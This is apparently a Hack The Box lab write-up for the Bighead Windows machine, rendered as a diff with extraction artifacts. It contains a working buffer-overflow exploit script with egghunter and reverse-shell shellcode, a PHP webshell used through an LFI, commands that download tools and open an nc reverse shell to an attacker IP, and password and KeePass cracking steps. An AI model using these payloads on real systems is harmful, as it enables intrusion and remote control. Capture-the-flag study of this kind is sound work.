@@ -1,0 +1,685 @@
+Bighead
+
+5t h May 2019 / Document No D19.100.16
+
+Prepared By: MinatoTW
+Machine Author: 3mrgnc3
+Difficulty: Insane
+Classification: Official
+
+                                                                       Page 1 / 35
+SYNOPSIS
+
+Bighead is an "Insane" difficulty windows box which deals with advanced binary exploitation,
+registry enumeration, code review and NTFS ADS. The source code of the web server is found
+on github which needs to be analyzed to find an overflow in a HEAD request. It can be exploited
+using heap spraying and egg hunting which results in a shell. Registry enumeration leads to hex
+encoded password for nginx which is used to obtain an ssh shell through port forward. On
+reviewing the PHP code a file vulnerable to LFI is found which is exploited to gain a root shell.
+The root flag has an ADS which is a keepass database. This is cracked using the key to gain the
+final flag.
+
+Skills Required              Skills Learned
+
+     Web server enumeration       Heap spraying
+     Exploit development          Egg hunting technique
+     Reverse Engineering          Extracting ADS
+     Windows enumeration
+     Code review
+
+                                                         Page 2 / 35
+ENUMERATION
+
+NMAP
+
+ $ nmap -sC -sV -p- 1 0.10.10.112
+ Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-28 2 1: 0 3 EDT
+ Nmap scan report f or bighead.htb (1 0.10.10.112)
+ Host i s up (0.0076s latency).
+ Not shown: 65534 filtered ports
+ PORT STATE SERVICE VERSION
+ 80/tcp open http nginx 1.14.0
+ |_http-server-header: nginx/1 .14.0
+ |_http-title: PiperNet Comes
+
+Just port 80 is running with nginx service on it.
+
+NGINX - PORT 80
+
+Nginx was running a website depicting a cryptocurrency related company.
+
+GOBUSTER
+
+Running gobuster on it found a few files,
+ $ gobuster -q -w /usr/share/wordlists/dirb/big.txt -t 50 -u
+ http://bighead.htb
+ /Images (Status: 301)
+ /assets (Status: 301)
+ /backend (Status: 302)
+ /images (Status: 301)
+ /updatecheck (Status: 302)
+
+The backend page redirects to /BIghead which displays an error pointing to
+http://bighead.htb/r/error_log which was the same page.
+
+                                                                                                                 Page 3 / 35
+ $ curl http://bighead.htb/backend
+ <html>
+ <head><title>302 Found</title></head>
+ <body bgcolor="white">
+ <center><h1>302 Found</h1></center>
+ <hr><center>nginx/1.14.0</center>
+ </body>
+ </html>
+
+The /updatecheck page redirects to h ttp://code.bighead.htb/phpmyadmin/phpinfo.php which
+should be added to the hosts file.
+ curl http://bighead.htb/updatecheck -v
+
+                                                                                                                 Page 4 / 35
+After adding it to the hosts file the page displayed the output of phpinfo() which gave us
+information about the OS.
+
+Enumerating the code.bighead.htb vhost further, anything matching ^index was getting
+redirected to /testlink.
+ curl http://code.bighead.htb/index.php -v
+
+Directly visiting h ttp://code.bighead.htb/testlink redirected to
+http://127.0.0.1:5080/testlink/login.php .
+
+                                                                                                                 Page 5 / 35
+On swapping the localhost url with the vhost , we find a page with lots of errors and path
+disclosure.
+
+Running gobuster on the testlink directory shows an interesting hit called "note".
+
+$ gobuster -w directory-list-2.3-medium.txt -t 50 -u
+
+http://code.bighead.htb/testlink | grep -v index       [96/96]
+
+=====================================================
+
+Gobuster v2.0.1         OJ Reeves (@TheColonial)
+
+=====================================================
+
+[+] Mode         : dir
+
+[+] Url/Domain : http://code.bighead.htb/testlink/
+
+[+] Threads      : 50
+
+[+] Wordlist     : directory-list-2.3-medium.txt
+
+[+] Status codes : 200,204,301,302,307,403
+
+[+] Timeout      : 10s
+
+=====================================================
+2019/05/07 21:15:49 Starting gobuster
+=====================================================
+/docs (Status: 301)
+/login (Status: 200)
+/plugins (Status: 301)
+-----------------SNIP---------------
+/LICENSE (Status: 200)
+/linkto (Status: 200)
+/note (Status: 200)
+
+                                                                                    Page 6 / 35
+Hitting the page results in a note which hints about another vhost dev.
+
+Running gobuster on dev vhost shows many files out of which /coffee returns a 418 response
+code and any request with ^blog was being redirected.
+
+ $ gobuster -w directory-list-2.3-medium.txt -t 20 -u
+ http://dev.bighead.htb/
+
+=====================================================
+
+Gobuster v2.0.1            OJ Reeves (@TheColonial)
+
+=====================================================
+
+[+] Mode         : dir
+
+[+] Url/Domain : http://dev.bighead.htb/
+
+[+] Threads      : 20
+
+[+] Wordlist     : directory-list-2.3-medium.txt
+
+[+] Status codes : 200,204,301,302,307,403
+
+[+] Timeout      : 10s
+
+=====================================================
+
+2019/05/07 21:58:27 Starting gobuster
+
+=====================================================
+
+/blog (Status: 302)
+
+/blogs (Status: 302)
+
+/wp-content (Status: 302)
+
+/bloggers (Status: 302)
+
+/blogger (Status: 302)
+
+---------SNIP----------
+
+/coffee (Status : 418)
+
+/blogsql (Status: 302)
+
+/blog1 (Status: 302)
+
+/blogbling (Status: 302)
+
+                                                                         Page 7 / 35
+Checking the response via Firefox tools or curl reveals another server header "BigheadWebSvr
+1.0".
+
+A Google search reveals a github repo by the maker of the box.
+
+The repo contains a zip file which can be downloaded.
+
+CRACKING THE ZIP
+
+After downloading the zip file from the repo we'll find it password protected. John the ripper can
+be used to crack the zip.
+ zip2john BHWS_Backup.zip > hash
+
+                                                                                                                 Page 8 / 35
+ john -w=rockyou.txt h ash
+
+ root@Ubuntu# john -w=rockyou.txt hash
+ Using default input encoding: UTF-8
+ Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
+ Node numbers 1-4 of 4 (fork)
+ Press ' q' or Ctrl-C to abort, almost any other key for status
+ thepiedpiper89 (BHWS_Backup.zip)
+ 1 1g 0:00:00:00 DONE (2018-11-26 21:41) 100.0g/s 100.0p/s 100.0c/s 100.0C/s
+ thepiedpiper89
+The password is found to be "thepipedpiper89" . Extracting from the archive using this results in
+a note and few config files.
+
+As the note says, the vulnerable software was removed from it. Maybe it was present in the older
+commits. Navigate to the first commit here and download the old archive.
+Repeating the same process, the password is found to be "bighead".
+
+                                                                                                                 Page 9 / 35
+Extract the contents using 7z,
+ 7z x BHWS_Backup.zip # password : bighead
+This time we receive a dll and an executable which runs as the web server on bighead.
+
+REVERSING THE BINARY
+
+Using ghidra we can reverse the binary to find any exploitable functions. Run ghidra and create a
+new project. Then select the code browser from the toolbar. Once the project is open go to FIle >
+Import FIle > Select BigheadWebSvr.exe. Then click analyze and ignore any warnings.
+To start decompiling in the symbol tree window find the Functions branch, expand it and go to
+main > _main.
+
+                                                                                                                Page 10 / 35
+The code should appear in both assembly and pseudocode on the right. In the decompile
+window we see that it takes in arguments, creates a socket and if no error occurs it drops into a
+while loop which listens for connections.
+
+On receiving a connect the function ConnectionHandler is called. Double click on it to navigate.
+The function receives the socket fd, then allocates some memory to copy the request data into.
+Then it drops into a if-else-if nest to determine the request type. Here it's seen that the GET
+request to /coffee returns the 418 error.
+
+                                                                                                                 Page 11 / 35
+Moving further, if the request isn't a GET or POST then it checks for a HEAD request and calls the
+function _Function4.
+
+Double click on it to navigate. We see that it receives the data request and uses strcpy to copy it
+to a local buffer of length 32 and then return. As strcpy doesn't control the number of input
+characters which results in a buffer overflow.
+
+This can be a potential exploit which needs dynamic analysis.
+
+EXPLOIT DEVELOPMENT
+
+From the phpmyadmin page found earlier we know that the target is running 32 bit Windows
+server 2008. It can be downloaded from here so that we can emulate the target environment.
+
+                                                                                                                Page 12 / 35
+Download the Immunity Debugger from here and the plugin mona.py from h ere. After installing
+immunity place mona.py into the plugins folder at "C:\Program Files\Immunity Inc\Immunity
+Debugger\PyCommands".
+Trying to run the binary results in an error about a missing dependency.
+
+A quick google search leads us to sourceforge from where we can download the
+libmingwex-5.0.2-mingw32-dll-0.tar.xz package. Extract the contents and transfer the dll to the
+Windows VM and place it in the same folder as the executable.
+ tar xvf libmingwex-5.0.2-mingw32-dll-0.tar.xz
+Running the executable now shouldn't return an error and the server should start listening.
+
+On checking netstat we find port 8008 listening which can be confirmed from the nginx config.
+
+                                                                                                                Page 13 / 35
+From static analysis we know that the handler for the HEAD request is vulnerable to buffer
+overflow. So, lets try sending is a payload greater than 32 characters.
+Before that turn off the firewall, run CMD as Administrator and type,
+ netsh advfirewall set allprofiles state off
+
+DETERMINING THE BUFFER SIZE
+
+Now to send our payload,
+ curl --head 192.168.0.103:8008/$(python -c " print 'A'*100")
+
+And it's seen that the server crashes instantly. Restart the server and fire up immunity.
+                                                                                                                Page 14 / 35
+Click on FIle > Attach > BigheadWebSvr and then hit F9 to run it. Then sending the curl request,
+ curl --head 192.168.0.103:8008/$(python -c "print 'A'*100")
+
+We see EIP getting overwritten by our payload. Let's determine the buffer size, use mona to
+create a pattern
+ !mona pattern_create 100
+
+Now copy the generated pattern as use it to make a curl request.
+
+                                                                                                                Page 15 / 35
+Right click on ESP and follow in dump, here the pattern can be found at memory address
+0131FB40 and the ESP being at 0131FB28 with the contents AA0A.
+
+The difference comes out as 24 in hex which is 36 bytes. And as each character is 2 bits in size,
+we can fit in 72 characters in our buffer.
+ root@Ubuntu:~# python -c 'print 0x0131FB40-0x0131FB28'
+ 24
+ root@Ubuntu:~# python -c 'print int(0x24)'
+ 36
+Lets confirm this to see if we control EIP.
+ curl --head 192.168.0.100:8008/$(python -c ' print "A"*72 + "B"*8')
+
+It's confirm that we can control EIP.
+
+USING JMP EAX
+
+Now we need to find a JMP EAX instruction so that we can point our EIP to it and then jump to
+the top of the buffer to execute our shellcode. But before that let us examine the binary
+restrictions in effect.
+
+                                                                                                                Page 16 / 35
+ !mona modules
+
+We notice that all protections are turned off for the binary as well as for the DLL dependencies.
+To turn off system wide DEP, run CMD as Administrator and issue.
+ bcdedit /set nx AlwaysOff
+And reboot. After that, run immunity again and right click > Search for > All commands in all
+modules and enter JMP EAX.
+
+We see that bHeadSvr.dll has it available at 625012F2 which is F2125062 in Little Endian.
+Right click on the instruction and click Toggle breakpoint.
+Replace the B's with the address and run the program again.
+ curl --head 192.168.0.100:8008/$(python -c ' print "A"*72 + "F 2125062" ')
+
+                                                                                                                Page 17 / 35
+We see that EIP hits on our breakpoint and on continuing we jump to the address of EAX.
+
+Now that we can jump to eax, we need to place our shellcode on the stack. But due to a small
+buffer size it's not possible to fit it in. This calls for the need of an Egg hunter.
+
+EGG HUNTER
+
+An egg hunter is a piece of code which searches for our shellcode in the memory of the process
+by finding a particular string prefixed to it.
+We can use mona to create an egghunter shellcode. By default the egg is set to w00t but it can
+be any four character string.
+ !mona egghunter -t HTB!
+Here I'm using "HTB!" As my egg. Mona generates the shellcode which we copy and use in our
+script.
+
+                                                                                                                Page 18 / 35
+Here's what the script looks like -
+
+ #!/usr/bin/python
+
+ from pwn import *
+
+ target = " 192.168.0.100"
+ port = 8 008
+ buflen = 72
+ jmp_eax = " f2125062" # In Little Endian
+
+ egg =
+ "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x
+ 48\x54\x42\x21\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" # From mona
+
+ # msfvenom -p windows/shell_reverse_tcp -b \x00\x0a\x0d -f python
+ LHOST=192.168.0.105 LPORT=80 -v payload
+
+ payload = "HTB!HTB!" # Adding egg at the start
+ payload += " \xbb\x56\x51\xbf\x0f\xda\xc1\xd9\x74\x24\xf4\x5e\x33"
+ payload += " \xc9\xb1\x52\x83\xc6\x04\x31\x5e\x0e\x03\x08\x5f\x5d"
+ payload += " \xfa\x48\xb7\x23\x05\xb0\x48\x44\x8f\x55\x79\x44\xeb"
+ payload += " \x1e\x2a\x74\x7f\x72\xc7\xff\x2d\x66\x5c\x8d\xf9\x89"
+ payload += "\xd5\x38\xdc\xa4\xe6\x11\x1c\xa7\x64\x68\x71\x07\x54"
+ payload += " \xa3\x84\x46\x91\xde\x65\x1a\x4a\x94\xd8\x8a\xff\xe0"
+ payload += "\xe0\x21\xb3\xe5\x60\xd6\x04\x07\x40\x49\x1e\x5e\x42"
+ payload += "\x68\xf3\xea\xcb\x72\x10\xd6\x82\x09\xe2\xac\x14\xdb"
+ payload += " \x3a\x4c\xba\x22\xf3\xbf\xc2\x63\x34\x20\xb1\x9d\x46"
+ payload += " \xdd\xc2\x5a\x34\x39\x46\x78\x9e\xca\xf0\xa4\x1e\x1e"
+ payload += "\x66\x2f\x2c\xeb\xec\x77\x31\xea\x21\x0c\x4d\x67\xc4"
+
+                                                                                                                Page 19 / 35
+payload += " \xc2\xc7\x33\xe3\xc6\x8c\xe0\x8a\x5f\x69\x46\xb2\xbf"
+payload += " \xd2\x37\x16\xb4\xff\x2c\x2b\x97\x97\x81\x06\x27\x68"
+payload += "\x8e\x11\x54\x5a\x11\x8a\xf2\xd6\xda\x14\x05\x18\xf1"
+payload += "\xe1\x99\xe7\xfa\x11\xb0\x23\xae\x41\xaa\x82\xcf\x09"
+payload += " \x2a\x2a\x1a\x9d\x7a\x84\xf5\x5e\x2a\x64\xa6\x36\x20"
+payload += "\x6b\x99\x27\x4b\xa1\xb2\xc2\xb6\x22\x7d\xba\xb8\xdb"
+payload += " \x15\xb9\xb8\x1b\xb6\x34\x5e\x71\x26\x11\xc9\xee\xdf"
+payload += " \x38\x81\x8f\x20\x97\xec\x90\xab\x14\x11\x5e\x5c\x50"
+payload += "\x01\x37\xac\x2f\x7b\x9e\xb3\x85\x13\x7c\x21\x42\xe3"
+payload += "\x0b\x5a\xdd\xb4\x5c\xac\x14\x50\x71\x97\x8e\x46\x88"
+payload += "\x41\xe8\xc2\x57\xb2\xf7\xcb\x1a\x8e\xd3\xdb\xe2\x0f"
+payload += "\x58\x8f\xba\x59\x36\x79\x7d\x30\xf8\xd3\xd7\xef\x52"
+payload += " \xb3\xae\xc3\x64\xc5\xae\x09\x13\x29\x1e\xe4\x62\x56"
+payload += " \xaf\x60\x63\x2f\xcd\x10\x8c\xfa\x55\x20\xc7\xa6\xfc"
+payload += " \xa9\x8e\x33\xbd\xb7\x30\xee\x82\xc1\xb2\x1a\x7b\x36"
+payload += " \xaa\x6f\x7e\x72\x6c\x9c\xf2\xeb\x19\xa2\xa1\x0c\x08"
+
+# We manually create headers to avoid extra stuff
+print "Spraying heap"
+req = 'POST /coffee HTTP/1.1\r\n'
+req += 'Host: dev.bighead.htb\r\n'
+req += ' Content-Length: {}\r\n\r\n'.format(len(payload))
+req += payload + '\r\n'
+req += ' \r\n'
+for i i n range(3):
+
+         r = remote(target, int(port))
+         r.send(req)
+         r.close()
+
+print "Triggering shellcode"
+egg_req = 'HEAD /'
+egg_req += egg.encode(' hex')
+egg_req += ' A' * ( buflen - (len(egg.encode(' hex')) ))
+egg_req += jmp_eax
+egg_req += ' HTTP/1.1 \r\nHost: dev.bighead.htb\r\n\r\n'
+r = remote(target, int(port))
+r.send(egg_req)
+r.close()
+
+                                                                    Page 20 / 35
+We're using msfvenom to generate the shellcode. Make sure to use the -b switch to avoid bad
+characters. Next we spray the heap with the payload after prepending the egg to it. We need to
+send the request manually to avoid url encoding and extra headers. Then we trigger the
+egghunter by sending a HEAD request which finds the shellcode and executes it.
+
+Executing it resulted in a shell.
+
+                                   Page 21 / 35
+FOOTHOLD
+
+Now that we have a working exploit, all that is left is to try it on the box. But before that we need
+to make a minor adjustment. Due to the nginx reverse proxy our payload gets url encoded while
+passing through it. We can fix this by manually deleting the header or specifying an encoding
+type. Let's gzip encode our payload and specify it in our header. The change is made here,
+ req = 'POST /coffee HTTP/1.1\r\n'
+ req += 'Content-Encoding: gzip\r\n'
+ req += 'Host: dev.bighead.htb\r\n'
+ req += ' Content-Length: {}\r\n\r\n'.format(len(payload))
+ req += zlib.compress(payload) + '\r\n'
+We manually specified gzip encoding and used zlib to compress the shellcode so that proxy
+doesn't destroy it with url encoding.
+
+Note: Depending on the load and number of users the egghunter might take a while to return a
+shell, so be patient.
+
+                                                                                                               Page 22 / 35
+LATERAL MOVEMENT
+ENUMERATION
+
+After getting a shell as nelson, we run an enumeration script like J AWS .
+ powershell -ep bypass -c iex(new-object
+ net.webclient).downloadstring(' http://10.10.14.2:8000/jaws-enum.ps1')
+After running the script these are the points to be noted down -
+
+Bitvise SSH Server
+
+An SSH server is running on the box with the executable BvSshServer.exe. A quick Google
+search leads us to "B itvise SSH Server".
+
+On listing the ports which are listening, an uncommon port 2020 is found to be open. So chances
+are that the SSH Server is listening on 2020.
+
+APACHE/XAMPP RUNNING AS SYSTEM
+
+                                                                                                               Page 23 / 35
+The process httpd.exe is an executable run by the Apache server located at
+C:\xampp\apache\bin\httpd.exe. As we can't see the process owner it should be running as
+SYSTEM or another high privilege user.
+
+ENUMERATING REGISTRY
+
+We look for registry keys which have passwords in it using reg query.
+ reg query HKLM /f Password /t REG_SZ /s
+
+An uncommon key for nginx is found with a PasswordHash.
+
+The hash is hex encoded which can be decoded using xxd.
+
+It looks like a troll. Let's query the entire key to see other information in it.
+ reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx
+
+Looks like it's for the nginx proxy configuration. A new value for Authenticate field is found which
+again is a hex encoded hash. This is decoded using xxd.
+
+The null bytes are to be removed which are a result of UTF-16 encoding on Windows.
+
+C:\nginx>reg query
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx
+
+Type REG_DWORD 0x10
+
+Start REG_DWORD 0x 2
+
+ErrorControl  REG_DWORD 0x1
+
+                                                            Page 24 / 35
+ImagePath REG_EXPAND_SZ    C:\Program Files\nssm\win32\nssm.exe
+
+DisplayName REG_SZ  Nginx
+
+ObjectName REG_SZ   .\nginx
+
+Description REG_SZ  Nginx web server and proxy.
+
+DelayedAutostart REG_DWORD 0x 0
+
+FailureActionsOnNonCrashFailures REG_DWORD 0x1
+
+FailureActions REG_BINARY
+
+00000000000000000000000003000000140000000100000060E A00000100000060EA0000010
+
+0000060EA0000
+
+Authenticate   REG_BINARY
+
+4800370033004200700055005900320055007100390055002D 0059007500670079007400350
+
+04600590055006200590030002D0055003800370074003800370000000000
+
+PasswordHash   REG_SZ
+
+336d72676e6333205361797a205472794861726465722e2e2e203b440a
+
+ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx\Parameters
+
+Decoding the hash gives us a password string "H 73BpUY2Uq9U-Yugyt5FYUbY0-U87t87" .
+
+ echo
+ 4800370033004200700055005900320055007100390055002D0059007500670079007400350
+ 04600590055006200590030002D0055003800370074003800370000000000 | sed s/00//g
+ | xxd -p -r
+
+SSH AS NGINX USER
+
+As the SSH Server is listening on localhost we need to forward it to be able to connect. We can
+use c hisel to do the job for us.
+Download the Linux and Windows binaries and then transfer the Windows binary to the box.
+ cd \users\public
+ certutil -f -urlcache -split http://1 0.10.14.2:8 000/ chisel.exe chisel.exe
+
+                                                                                                               Page 25 / 35
+Next run the server locally on Linux with,
+ ./chisel_linux_amd64 server --reverse -p 80
+And then on Bighead run the client,
+ .\chisel.exe client 1 0.10.1 4.2 R:127.0.0.1:2 020:127.0.0.1:2 222
+This will forward connections to our localhost port 2222 to localhost 2020 on the box.
+
+Then ssh in as nginx using the password we obtained earlier.
+ ssh nginx@127.0.0.1 -p 2222 # password : H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87
+
+Which lands us into the bitvise shell.
+
+                                                                                                               Page 26 / 35
+PRIVILEGE ESCALATION
+INSPECTING PHP FILES
+
+We land in a shell which has all the files required by the webserver to run. There's a folder named
+apps which contains the testlink folder which we came across during the initial enumeration.
+
+All the files are owned by the Administrators group. So we can't write a file to get it executed as
+SYSTEM. We see the file linkto.php was edited recently. We transfer the file to inspect it.
+ scp -P 2222 nginx@127.0.0.1:/apps/testlink/htdocs/linkto.php .
+The file is from the Testlink package however, some custom code was added to it.
+ // alpha 0.0.1 implementation of our new pipercoin authentication tech
+ // full API not done yet. just submit tokens with requests for now.
+ if(i sset( $_POST['PiperID'])){$PiperCoinAuth = $_POST['PiperCoinID'] ;
+ //plugins/ppiper/pipercoin.php
+
+           $PiperCoinSess = base64_decode($PiperCoinAuth);
+           $PiperCoinAvitar = (string)$PiperCoinSess;}
+ // some session and settings stuff from original index.php
+We see that it loads the plugin through the PiperCoinID parameter only if the PiperID is set.
+Searching for these parameters in the file we find that the variable PiperCoinAuth is included on
+line 62.
+ require_once( $PiperCoinAuth);
+
+                                                                                                                Page 27 / 35
+Using this we can include random files as there's no filtering on the PiperCoinID parameter and
+execute php code from the web page. We write a php file to C:\Users\Public folder from nelson's
+shell. Create a file pwn.php with contents,
+ echo < ?php system($_GET[' pwn'] ); ? >
+The transfer it to the box,
+ cd C:\Users\Public
+ certutil -f -split -urlcache http://10.10.1 4.2: 8 000/pwn.php pwn.php
+
+Now we can execute code from the linkto.php file on code.bighead.htb .
+
+As it's seen whoami got executed and Apache is running as System.
+
+                                                                                                               Page 28 / 35
+SYSTEM SHELL
+
+We use the vulnerability to download and execute a shell on the target. The URL would be,
+ /testlink/linkto.php?pwn=certutil -f -split -urlcache
+ http://10.10. 14.2: 8000/nc.exe C:\Users\Public\nc.exe &&
+ C:\Users\Public\nc.exe 10.10. 14.2 4444 -e cmd.exe
+URL encode the payload and send the request to receive a shell as SYSTEM.
+
+The user flag can be found at C:\Users\nginx\Desktop .
+
+                                                                                                               Page 29 / 35
+CRACKING KEEPASS DATABASE
+
+On navigating to Administrator's Desktop the flag isn't seen as it's hidden. It can be viewed using
+"dir /ah".
+
+The flag is another troll but on checking the ADS ( Alternate Data Streams ) we see one for
+root.txt.
+ dir /ah /r
+
+                                                                                                               Page 30 / 35
+To view the contents use,
+ more < root.txt:Zone.Identifier
+
+The file appears to have binary information and we'll have to transfer it for further inspection.
+
+First encode the file using certutil and the copy it locally to decode and save.
+
+ certutil -encode root.txt:Zone.Identifier foo.txt
+ base64 -d foo.txt > foo
+ file foo
+
+We notice that the file is a Keepass 2 database.
+
+                                                                                  Page 31 / 35
+CRACKING THE DB
+
+The keepass config is generally saved in the %APPDATA% folder of the user which here is
+C:\Users\Administrator\AppData\Roaming .
+
+From the config file it's found that the database needs both a password and keyfile to unlock.
+The keyfile is located at C:\Users\Administrator\Pictures\admin.png .
+ <K eySources>
+
+                   <A ssociation>
+ <D atabasePath> ..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier</D
+ atabasePath>
+ <Password> true</Password>
+ <K eyFilePath>..\..\Users\Administrator\Pictures\admin.png</K eyFilePath>
+
+                   </Association>
+ </KeySources>
+Transfer the admin.png by encoding it with base64 and then decoding it locally.
+ certutil -encode admin.png key.txt
+ type key.txt
+ base64 -d key.txt > admin.png
+
+                                                                                                               Page 32 / 35
+We'll use the keeepass2john utility from JTR suite to get the hash. Make sure you have the latest
+version, if not grab it from here - h ttps://github.com/magnumripper/JohnTheRipper.
+ ./keepass2john -k ~/Documents/HTB/Bighead/admin.png
+ ~/Documents/HTB/Bighead/root.kdbx > hash
+Then crack it using rockyou.txt which should be fairly fast. The password is obtained as
+"darkness".
+
+                                                                                                                Page 33 / 35
+We can use keepass2 on Linux to open the file. Navigate to the keepass database and then enter
+the password "darkness" and choose the keyfile admin.png. It results in an entry for Gilfoyle with
+root.txt hash in it.
+
+                                                                                                                Page 34 / 35
+APPENDIX
+Installing John the Ripper
+
+ Apt install autoconf automake
+ git c lone https://github.com/magnumripper/JohnTheRipper
+ cd JohnTheRipper
+ cd src
+ ./configure && make
+
+Setting up ghidra
+
+ apt install openjdk-11-jdk
+ wget https://www.ghidra-sre.org/ghidra_9.0.2_PUBLIC_20190403.zip
+ unzip ghidra_9.0.2_PUBLIC_20190403.zip
+ cd ghidra_9.0.2
+ ./ghidraRun
+
+Mona.py command manual
+
+https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
+
+Egghunter in depth
+
+http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
+https://www.fuzzysecurity.com/tutorials/expDev/4.html
+
+                                                                                                               Page 35 / 35
+
